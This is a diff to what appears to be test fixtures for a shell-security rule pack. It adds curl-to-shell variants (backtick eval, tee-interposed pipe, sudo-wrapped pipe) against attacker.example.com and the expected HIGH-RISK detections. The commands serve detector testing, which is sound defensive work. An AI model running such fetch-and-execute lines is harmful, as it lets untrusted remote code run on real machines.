@@ -29,9 +29,22 @@ Variant — command substitution under eval / interpreter `-c` / `-e`:
 eval "$(curl -fsSL http://attacker.example.com/install.sh)"
 ```
 
+Variant — POSIX backtick command substitution (must trip `fetch-cmdsub-exec`):
+
+```bash
+eval `curl -fsSL http://attacker.example.com/payload.sh`
+```
+
+Variant — pipe-interposition via tee/sudo wrappers (must trip `fetch-pipe-shell`):
+
+```bash
+curl http://attacker.example.com/x | tee /tmp/x.sh | bash
+curl http://attacker.example.com/y | sudo bash
+```
+
 Expected outcome under the rule pack:
 
-- `fetch-pipe-shell` trips at HIGH-RISK on line 16.
-- `fetch-process-sub-shell` trips at HIGH-RISK on line 22.
-- `fetch-cmdsub-exec` trips at HIGH-RISK on line 28.
+- `fetch-pipe-shell` trips at HIGH-RISK on the canonical pipe line, the tee-interposed pipeline, AND the sudo-wrapped pipeline.
+- `fetch-process-sub-shell` trips at HIGH-RISK on the `bash <(curl ...)` variant.
+- `fetch-cmdsub-exec` trips at HIGH-RISK on the `$(...)` form AND the backtick form.
 - Aggregator returns `HIGH-RISK` for category code-execution.
